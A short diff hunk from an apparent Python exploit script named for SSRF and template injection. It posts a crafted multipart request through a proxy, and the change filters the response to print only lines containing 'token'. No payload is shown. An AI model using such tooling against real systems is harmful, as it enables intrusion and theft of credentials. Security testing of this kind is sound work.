@@ -53,7 +53,10 @@ Content-Disposition: form-data; name="0"
     data2 = data.replace("\n", "\r\n")
 
     response=requests.post(url=f"http://{url}", proxies=proxies, headers=headers, data=data2)
-    print(response.text)
+    response_text=response.text
+    for line in response_text.splitlines():
+        if "token" in line:
+            print(line)
 
 ssrf_ssti()
 
